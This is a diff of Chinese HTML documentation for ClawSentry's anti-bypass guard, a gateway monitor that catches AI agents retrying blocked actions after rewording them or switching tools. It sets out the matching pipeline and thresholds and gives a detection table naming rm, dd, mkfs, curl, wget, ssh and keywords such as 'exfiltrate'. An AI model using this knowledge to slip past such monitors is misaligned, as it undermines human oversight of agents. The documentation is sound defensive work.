-<p>跨工具/脚本相似度更容易受上下文影响。为了避免误杀，<code>CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION=block</code> 会被配置校验拒绝并回退到 <code>force_l3</code>。如需更严格处理，请用 <code>defer</code> 交给 operator 确认。</p>
+<p class="admonition-title">跨工具阻断限制</p>
+<p>将 <code>CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION=block</code> 会被 <code>DetectionConfig</code> 校验拒绝，静默回退到 <code>force_l3</code>。跨工具匹配意味着智能体很可能通过不同接口进行重试；更高的不确定性要求人工或 L3 审查，而非本地强制阻断。</p>
 </div>
 <hr />
-<h2 id="actions">决策动作怎么理解？<a class="headerlink" href="#actions" title="Permanent link">&para;</a></h2>
+<h2 id="intent-classification">破坏性意图分类<a class="headerlink" href="#intent-classification" title="Permanent link">&para;</a></h2>
+<p>防护层在指纹计算之前，会将每个进入动作分类到破坏性意图标签和操作类别。只有不属于 <code>non-destructive</code> 的动作才有资格参与同工具软匹配、跨工具匹配或 LLM 候选。</p>
+<h3 id="_3">意图标签与操作类别<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>意图标签</th>
+<th>触发条件</th>
+<th>破坏性操作类别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rm</code></td>
+<td>token 头为 <code>rm</code></td>
+<td><code>delete_path</code> 或 <code>delete_tree</code>（若含 <code>-r</code>/<code>-rf</code>）</td>
+</tr>
+<tr>
+<td><code>rmdir</code></td>
+<td>token 头为 <code>rmdir</code></td>
+<td><code>delete_tree</code></td>
+</tr>
+<tr>
+<td><code>unlink</code></td>
+<td>token 头为 <code>unlink</code></td>
+<td><code>delete_path</code></td>
+</tr>
+<tr>
+<td><code>shred</code></td>
+<td>token 头为 <code>shred</code></td>
+<td><code>destructive_storage</code></td>
+</tr>
+<tr>
+<td><code>dd</code></td>
+<td>token 头为 <code>dd</code></td>
+<td><code>destructive_storage</code></td>
+</tr>
+<tr>
+<td><code>mkfs</code></td>
+<td>token 头为 <code>mkfs</code></td>
+<td><code>destructive_storage</code></td>
+</tr>
+<tr>
+<td><code>chmod</code></td>
+<td>token 头为 <code>chmod</code></td>
+<td><code>permission_change</code></td>
+</tr>
+<tr>
+<td><code>chown</code></td>
+<td>token 头为 <code>chown</code></td>
+<td><code>permission_change</code></td>
+</tr>
+<tr>
+<td><code>curl</code> / <code>wget</code> / <code>scp</code> / <code>rsync</code> / <code>ssh</code></td>
+<td>token 头匹配</td>
+<td><code>network_transfer</code></td>
+</tr>
+<tr>
+<td><code>git</code></td>
+<td>token 头为 <code>git</code></td>
+<td><code>vcs_operation</code></td>
+</tr>
+<tr>
+<td><code>destructive-generic</code></td>
+<td>Python 删除 API：<code>shutil.rmtree</code>、<code>os.remove</code>、<code>os.unlink</code>、<code>os.rmdir</code>、<code>truncate</code>、<code>ftruncate</code></td>
+<td><code>delete_tree</code>、<code>delete_path</code> 或 <code>truncate_path</code></td>
+</tr>
+<tr>
+<td><code>destructive-generic</code></td>
+<td>关键词 token：<code>delete</code>、<code>remove</code>、<code>destroy</code>、<code>exfiltrate</code>、<code>download</code>、<code>upload</code>、<code>unlink</code>、<code>truncate</code></td>
+<td><code>destructive_generic</code></td>
+</tr>
+<tr>
+<td><code>non-destructive</code></td>
+<td>以上均不满足</td>
+<td><code>none</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>_same_destructive_operation_family</code> 辅助方法在跨工具范围匹配时将 <code>delete_tree</code> 和 <code>delete_path</code> 视为同一族。</p>
+<hr />
+<h2 id="detection-pipeline">检测管道<a class="headerlink" href="#detection-pipeline" title="Permanent link">&para;</a></h2>
+<p>防护层对每个 <code>PRE_ACTION</code> 事件按以下顺序执行：</p>
+<ol>
+<li><strong>防护启用检查。</strong> 若 <code>CS_ANTI_BYPASS_GUARD_ENABLED</code> 为 <code>false</code> 或事件类型不是 <code>PRE_ACTION</code>，立即返回 <code>None</code>。</li>
+<li><strong>TTL 驱逐。</strong> 在任何匹配之前，从会话队列中移除过期的紧凑记录、已拒绝效果记录和挂起效果持有。</li>
+<li><strong>计算当前指纹。</strong> 对进入事件计算：<code>raw_payload_hash</code>、<code>normalized_action_fingerprint</code>、<code>destructive_intent_label</code>、<code>destructive_intent_fingerprint</code>、<code>destructive_operation_category</code>、<code>normalized_feature_hashes</code>、<code>target_scope_categories</code>。</li>
+<li><strong>已拒绝效果检查（denied-effect check）。</strong> 逆序遍历会话的已拒绝效果内存。若当前动作的能力类别与历史被阻断能力存在交集，且效果目标哈希或工件族重叠，立即发出 <code>denied_effect_repeat</code> 匹配（跳过优先级列表）。</li>
+<li><strong>挂起效果检查（pending-effect check）。</strong> 逆序遍历会话的挂起效果持有。若能力 + 目标或族与 deferred 持有重叠，立即发出动作为 <code>defer</code> 的 <code>pending_effect_equivalent</code> 匹配。</li>
+<li>
+<p><strong>构建优先级候选列表。</strong> 对会话中每个通过 <code>_eligible_prior</code>（verdict 在 <code>CS_ANTI_BYPASS_PRIOR_VERDICTS</code> 中，风险 ≥ <code>CS_ANTI_BYPASS_MIN_PRIOR_RISK</code>）的历史记录，并行评估所有匹配分支，并以优先级键加入候选列表：</p>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>分支</th>
+<th>匹配类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0（最高）</td>
+<td>同工具 + <code>raw_payload_hash</code> 完全相同</td>
+<td><code>exact_raw_repeat</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td>同工具 + <code>normalized_action_fingerprint</code> 完全相同，双方均有破坏性</td>
+<td><code>normalized_destructive_repeat</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>同工具 + <code>normalized_feature_hashes</code> Jaccard ≥ 同工具阈值，双方均有破坏性</td>
+<td><code>normalized_destructive_repeat</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>跨工具 + <code>normalized_action_fingerprint</code> 完全相同，双方均有破坏性</td>
+<td><code>cross_tool_script_similarity</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>跨工具 + 相同操作族 + <code>target_scope_categories</code> 重叠</td>
+<td><code>cross_tool_script_similarity</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>跨工具 + <code>destructive_intent_fingerprint</code> 完全相同 + 范围/操作支持</td>
+<td><code>cross_tool_script_similarity</code></td>
+</tr>
+<tr>
+<td>6（最低）</td>
+<td>跨工具 + <code>normalized_feature_hashes</code> Jaccard ≥ 跨工具阈值，双方均有破坏性</td>
+<td><code>cross_tool_script_similarity</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>优先级"命中即返回"逻辑：</strong></p>
+<pre class="mermaid"><code>flowchart TD
+    A[遍历候选先决记录] --&gt; P0{优先级 0\n同工具 + raw_payload_hash\n完全匹配?}
+    P0 -- 命中 --&gt; R0[exact_raw_repeat\n返回此候选]
+    P0 -- 未命中 --&gt; P1{优先级 1\n同工具 + normalized_action_fingerprint\n完全匹配 + 双方均有破坏性?}
+    P1 -- 命中 --&gt; R1[normalized_destructive_repeat\n精确匹配，返回]
+    P1 -- 未命中 --&gt; P2{优先级 2\n同工具 Jaccard ≥ 同工具阈值\n+ 双方均有破坏性?}
+    P2 -- 命中 --&gt; R2[normalized_destructive_repeat\n软匹配，返回]
+    P2 -- 未命中 --&gt; P3{优先级 3\n跨工具 + normalized_action_fingerprint\n完全匹配 + 双方均有破坏性?}
+    P3 -- 命中 --&gt; R3[cross_tool_script_similarity\n返回]
+    P3 -- 未命中 --&gt; P4{优先级 4\n跨工具 + 相同操作族\n+ target_scope_categories 重叠?}
+    P4 -- 命中 --&gt; R4[cross_tool_script_similarity\n返回]
+    P4 -- 未命中 --&gt; P5{优先级 5\n跨工具 + destructive_intent_fingerprint\n完全匹配 + 范围/操作支持?}
+    P5 -- 命中 --&gt; R5[cross_tool_script_similarity\n返回]
+    P5 -- 未命中 --&gt; P6{优先级 6\n跨工具 Jaccard ≥ 跨工具阈值\n+ 双方均有破坏性?}
+    P6 -- 命中 --&gt; R6[cross_tool_script_similarity\n返回]
+    P6 -- 未命中 --&gt; End[无候选\n继续后续路径]</code></pre>
+</li>
+<li>
+<p><strong>选择最优匹配。</strong> 返回优先级键最小的候选；同键时以最近记录优先。若无候选，返回 <code>None</code>。</p>
+</li>
+<li><strong>LLM 辅助路径（回退，仅跨工具）。</strong> 当 LLM 识别已启用且确定性匹配返回 <code>None</code> 时，<code>llm_candidates()</code> 为满足条件的跨工具历史记录组装净化语义胶囊并提交给 <code>recognize_anti_bypass_candidate()</code>。若 LLM 返回 <code>matched=true</code> 且置信度 ≥ <code>CS_ANTI_BYPASS_LLM_CONFIDENCE_THRESHOLD</code>，则以 <code>recognition_source="llm_assisted"</code> 返回 <code>cross_tool_script_similarity</code> 匹配。</li>
+</ol>
+<p><strong>完整检测管道流程：</strong></p>
+<pre class="mermaid"><code>flowchart TD
+    A[PRE_ACTION 事件到达] --&gt; B{Guard 已启用 &amp;\n事件类型为 PRE_ACTION?}
+    B -- 否 --&gt; Z1[返回 None]
+    B -- 是 --&gt; C[TTL 驱逐过期记录\n紧凑记录 / 已拒绝效果 / 挂起效果]
+    C --&gt; D[计算当前事件指纹\nraw_payload_hash / normalized_action_fingerprint\ndestructive_intent 等]
+    D --&gt; E{denied-effect 检查\n能力类 + 效果目标重叠?}
+    E -- 是 --&gt; F[返回 denied_effect_repeat 匹配\n执行配置动作]
+    E -- 否 --&gt; G{pending-effect 检查\n能力 + 目标与挂起持有重叠?}
+    G -- 是 --&gt; H[返回 pending_effect_equivalent 匹配\n动作: defer]
+    G -- 否 --&gt; I[构建优先级候选列表\n遍历所有 eligible prior 记录\n优先级 0–6 并行评估]
+    I --&gt; J{找到最优候选?}
+    J -- 是 --&gt; K[返回最低优先级键候选\n执行配置动作]
+    J -- 否 --&gt; L{LLM 识别已启用 &amp;\n当前动作非 non-destructive?}
+    L -- 否 --&gt; Z2[返回 None\n继续正常策略评估]
+    L -- 是 --&gt; M[LLM 识别器\n发送净化语义胶囊]
+    M --&gt; N{LLM 匹配?\nmatched=true &amp;\nconfidence ≥ 阈值?}
+    N -- 是 --&gt; O[返回 cross_tool_script_similarity\nrecognition_source=llm_assisted]
+    N -- 否/超时/错误 --&gt; Z3[返回 None\nstate=degraded]</code></pre>
+<div class="admonition note">
+<p class="admonition-title">LLM 识别器是补充，而非替代</p>
+<p>LLM 路径仅在确定性候选列表为空且当前动作不是 <code>non-destructive</code> 时才会触达。LLM 不能将动作升级到 <code>block</code>；它始终使用 <code>CS_ANTI_BYPASS_LLM_ACTION</code>（默认 <code>force_l3</code>）。超时或提供者错误时，识别器返回 <code>state="degraded"</code>，事件无匹配地继续处理。</p>
+</div>
+<hr />
+<h2 id="memory-storage">内存存储<a class="headerlink" href="#memory-storage" title="Permanent link">&para;</a></h2>
+<h3 id="_4">触发写入的条件<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>以下六个条件全部满足，记录才会进入紧凑内存：</p>
+<ol>
+<li><code>CS_ANTI_BYPASS_GUARD_ENABLED=true</code></li>
+<li>事件类型为 <code>PRE_ACTION</code></li>
+<li><code>decision.final is True</code></li>
+<li>Verdict 在 <code>CS_ANTI_BYPASS_PRIOR_VERDICTS</code> 中（默认 <code>block,defer</code>）</li>
+<li>风险级别 ≥ <code>CS_ANTI_BYPASS_MIN_PRIOR_RISK</code>（默认 <code>high</code>）</li>
+<li>若 verdict 为 <code>allow</code>，还需设置 <code>CS_ANTI_BYPASS_RECORD_ALLOW_DECISIONS=true</code></li>
+</ol>
+<p>当 verdict 为 <code>defer</code> 但 <code>decision.final</code> 尚未设置时，写入的是 <code>PendingEffectHoldRecord</code> 而非 <code>AntiBypassRecord</code>。当 deferred 决策解析为 <code>block</code> 时，该记录提升为 <code>DeniedEffectMemoryRecord</code>。</p>
+<h3 id="_5">存储内容（不含原始内容）<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>用途</th>
+<th>含原始内容？</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>raw_payload_hash</code></td>
+<td>同工具精确重复检测</td>
+<td>否——canonical payload 投影的 SHA-256</td>
+</tr>
+<tr>
+<td><code>normalized_action_fingerprint</code></td>
+<td>归一化动作标识（已应用命令头归一化）</td>
+<td>否——归一化文本的 SHA-256</td>
+</tr>
+<tr>
+<td><code>destructive_intent_fingerprint</code></td>
+<td>跨工具匹配的意图标签标识</td>
+<td>否——标签字符串的 SHA-256</td>
+</tr>
+<tr>
+<td><code>destructive_intent_label</code></td>
+<td>人类可读标签（<code>rm</code>、<code>curl</code>、<code>destructive-generic</code> 等）</td>
+<td>否——仅类别标签</td>
+</tr>
+<tr>
+<td><code>destructive_operation_category</code></td>
+<td>范围匹配的操作族</td>
+<td>否——类别值</td>
+</tr>
+<tr>
+<td><code>normalized_feature_hashes</code></td>
+<td>Jaccard 相似度用的 token 哈希集合</td>
+<td>否——每个 token 的 SHA-256</td>
+</tr>
+<tr>
+<td><code>target_scope_categories</code></td>
+<td>路径范围类别（<code>tmp_path</code>、<code>credential_related</code> 等）</td>
+<td>否——类别值</td>
+</tr>
+<tr>
+<td><code>tool_name</code></td>
+<td>同工具 vs 跨工具路由的工具标识</td>
+<td>是——仅字符串名称</td>
+</tr>
+<tr>
+<td><code>policy_id</code>、<code>decision</code>、<code>risk_level</code></td>
+<td>追溯至历史决策的审计轨迹</td>
+<td>无原始内容</td>
+</tr>
+<tr>
+<td><code>event_id</code>、<code>record_id</code></td>
+<td>链接至持久化决策记录</td>
+<td>无原始内容</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition success">
+<p class="admonition-title">数据脱敏保证</p>
+<p><code>AntiBypassRecord</code> 从不存储原始命令、原始载荷、环境变量值、密钥或 L3 跟踪。会话 ID 本身仅以 SHA-256 哈希形式存储。内存为进程本地且易失；网关重启时清空。</p>
+</div>
+<h3 id="_6">内存边界<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>会话队列上限由 <code>CS_ANTI_BYPASS_MEMORY_MAX_RECORDS_PER_SESSION</code>（默认 <code>256</code>）控制。达到上限时最旧的记录从队列左端驱逐。记录也会按 TTL 过期（<code>CS_ANTI_BYPASS_MEMORY_TTL_S</code>，默认 <code>86400</code> 秒 = 24 小时）。</p>
+<hr />
+<h2 id="output-format">输出格式<a class="headerlink" href="#output-format" title="Permanent link">&para;</a></h2>
+<p>找到匹配时，<code>match_pre_action()</code> 返回一个 <code>AntiBypassMatch</code> 数据类。<code>to_metadata()</code> 方法将其序列化到决策元数据字典的 <code>anti_bypass</code> 键下。</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nt">&quot;anti_bypass&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">&quot;matched&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nt">&quot;match_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exact_raw_repeat&quot;</span><span class="p">,</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;block&quot;</span><span class="p">,</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="nt">&quot;recognition_source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;deterministic&quot;</span><span class="p">,</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="nt">&quot;match_reason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;raw_payload_hash&quot;</span><span class="p">,</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="nt">&quot;similarity_mode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;raw_hash&quot;</span><span class="p">,</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="nt">&quot;prior_event_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;evt-0042&quot;</span><span class="p">,</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="nt">&quot;prior_record_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42</span><span class="p">,</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="nt">&quot;prior_policy_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anti-bypass-exact-repeat&quot;</span><span class="p">,</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="nt">&quot;prior_risk_level&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;critical&quot;</span><span class="p">,</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="nt">&quot;raw_payload_hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span><span class="p">,</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="nt">&quot;normalized_action_fingerprint&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span><span class="p">,</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="nt">&quot;destructive_intent_fingerprint&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sha256:...&quot;</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>相关场景下附加的字段：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>出现条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>similarity</code></td>
+<td>基于 Jaccard 的匹配路径（同工具软匹配、跨工具 Jaccard）</td>
+</tr>
+<tr>
+<td><code>llm_confidence</code></td>
+<td>LLM 辅助识别</td>
+</tr>
+<tr>
+<td><code>llm_state</code></td>
+<td>LLM 路径已尝试</td>
+</tr>
+<tr>
+<td><code>reason_codes</code></td>
+<td>LLM 路径或弱信号跨工具</td>
+</tr>
+<tr>
+<td><code>evidence_categories</code></td>
+<td>LLM 路径或基于效果的匹配</td>
+</tr>
+<tr>
+<td><code>forced_tier</code></td>
+<td>动作为 <code>force_l2</code> 或 <code>force_l3</code></td>
+</tr>
+</tbody>
+</table>
+<p>当 LLM 路径已尝试但未返回匹配时，改为添加紧凑的 <code>anti_bypass_probe</code> 键：</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="nt">&quot;anti_bypass_probe&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nt">&quot;candidate_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="nt">&quot;llm_state&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;degraded&quot;</span><span class="p">,</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="nt">&quot;reason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;timeout&quot;</span><span class="p">,</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">    </span><span class="nt">&quot;budget_skipped&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">Defer SSE 内容脱敏</p>
+<p>当旁路防护以 <code>defer</code> 触发时，SSE 事件的 <code>command</code> 字段降级为仅保留工具名称，防止含有敏感信息的重试命令被转发到运营者界面。</p>
+</div>
+<hr />
+<h2 id="pipeline-position">在管道中的位置<a class="headerlink" href="#pipeline-position" title="Permanent link">&para;</a></h2>
+<p>旁路防护（Anti-bypass Guard）仅在 <code>PRE_ACTION</code> 事件上运行，位于隔离/会话执行层之后、正常 L1/L2/L3 策略评估之前。</p>
+<ol>
+<li><strong>智能体提交 PRE_ACTION</strong> — 工具调用到达网关</li>
+<li><strong>隔离 / 会话执行</strong> — 最高优先级层优先运行</li>
+<li><strong>旁路防护（Anti-bypass Guard）</strong> — 查询会话级紧凑内存；可能产生匹配</li>
+<li><strong>正常策略（L1 / L2 / L3）</strong> — 除非防护层发出强制阻断，否则继续执行</li>
+<li><strong>最终决策记录</strong> — <code>record_final_decision()</code> 在决策持久化后将紧凑指纹写入内存</li>
+</ol>
+<div class="admonition warning">
+<p class="admonition-title">仅写入最终决策</p>
+<p>防护内存仅在 <code>record_final_decision()</code> 路径中，<code>decision.final is True</code> 之后才会写入。非最终决策（例如中间状态的 <code>defer</code>）会写入 <code>PendingEffectHoldRecord</code>，待运营者批准或 deferred 决策超时后再解析。</p>
+</div>
+<hr />
+<h2 id="actions">处置动作<a class="headerlink" href="#actions" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
 <th>动作</th>
 <th>效果</th>
-<th>适合阶段</th>
+<th>适用场景</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>observe</code></td>
-<td>只写 metadata / counters，不改变判决</td>
-<td>观察期、误报评估</td>
+<td>记录匹配元数据；不改变 verdict</td>
+<td>审计/观察阶段、误报评估</td>
 </tr>
 <tr>
 <td><code>force_l2</code></td>
-<td>继续走 normal policy，但要求语义层参与</td>
-<td>低成本 review</td>
+<td>传递到正常策略但强制 L2 参与</td>
+<td>对疑似跟踪行为进行低成本语义审查</td>
 </tr>
 <tr>
 <td><code>force_l3</code></td>
-<td>继续走 normal policy，但要求 L3 深度审查</td>
-<td>高风险灰区</td>
+<td>传递到正常策略但强制 L3 深度审查</td>
+<td>跨工具匹配和 LLM 辅助匹配</td>
 </tr>
 <tr>
 <td><code>defer</code></td>
-<td>当前 follow-up 进入人工确认</td>
-<td>生产灰度、需要 operator 判断</td>
+<td>将跟踪行为提交给运营者确认</td>
+<td>生产灰度环境、归一化重复审查</td>
 </tr>
 <tr>
 <td><code>block</code></td>
-<td>当前 follow-up 本地阻断</td>
-<td>仅 exact / normalized 明确重复</td>
+<td>本地强制阻断跟踪行为</td>
+<td>仅限精确重复；同工具归一化匹配经验证后可用</td>
 </tr>
 </tbody>
 </table>
-<div class="cs-before-after">
-<div>
-<h3 id="guard">没有 Guard 时<a class="headerlink" href="#guard" title="Permanent link">&para;</a></h3>
-<ol>
-<li>Agent 被阻止一次  </li>
-<li>Agent 改写命令或换工具  </li>
-<li>普通 policy 重新从单次事件角度判断  </li>
-<li>审计人员需要手动关联两次尝试</li>
-</ol>
-</div>
-<div>
-<h3 id="guard_1">启用 Guard 后<a class="headerlink" href="#guard_1" title="Permanent link">&para;</a></h3>
-<ol>
-<li>第一次最终高风险判决写入 compact memory  </li>
-<li>后续 <code>PRE_ACTION</code> 先查同 session 指纹  </li>
-<li>命中后附带 prior record id / match type  </li>
-<li>按 rollout 策略 observe / review / enforce</li>
-</ol>
-</div>
-</div>
 <hr />
-<h2 id="quickstart">快速启用<a class="headerlink" href="#quickstart" title="Permanent link">&para;</a></h2>
-<p>建议按“三段式”灰度：先观察，再人工确认，最后只对精确重复启用阻断。</p>
-<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Observe only</label><label for="__tabbed_1_2">Review mode</label><label for="__tabbed_1_3">Focused enforce</label></div>
-<div class="tabbed-content">
-<div class="tabbed-block">
-<p>适合第一周上线：验证是否有误报，不改变任何 verdict。</p>
-<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>observe
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>observe
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>observe
-</span></code></pre></div>
-</div>
-<div class="tabbed-block">
-<p>适合生产灰度：重复危险动作进入人工确认，跨工具相似请求 L3 复核。</p>
-<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>defer
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>defer
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>force_l3
-</span></code></pre></div>
-</div>
-<div class="tabbed-block">
-<p>适合已经观察过误报的环境：只对 exact repeat 本地阻断，其他变体仍走 review。</p>
-<div class="language-bash highlight"><span class="filename">.clawsentry.env.local</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">CS_ANTI_BYPASS_GUARD_ENABLED</span><span class="o">=</span><span class="nb">true</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">CS_ANTI_BYPASS_EXACT_REPEAT_ACTION</span><span class="o">=</span>block
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nv">CS_ANTI_BYPASS_NORMALIZED_DESTRUCTIVE_REPEAT_ACTION</span><span class="o">=</span>defer
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nv">CS_ANTI_BYPASS_CROSS_TOOL_SIMILARITY_ACTION</span><span class="o">=</span>force_l3
-</span></code></pre></div>
-</div>
-</div>
-</div>
-<p>启动或重启 Gateway 后，使用 <code>clawsentry config show --effective</code> 或环境变量输出确认配置生效。</p>
-<hr />
-<h2 id="configuration">配置速查<a class="headerlink" href="#configuration" title="Permanent link">&para;</a></h2>
+<h2 id="configuration">配置<a class="headerlink" href="#configuration" title="Permanent link">&para;</a></h2>
+<h3 id="_7">核心开关<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -3205,135 +3607,206 @@
 <tr>
 <td><code>CS_ANTI_BYPASS_GUARD_ENABLED</code></td>
 <td><code>false</code></td>
-<td>总开关；默认不改变现有行为</td>
-</tr>
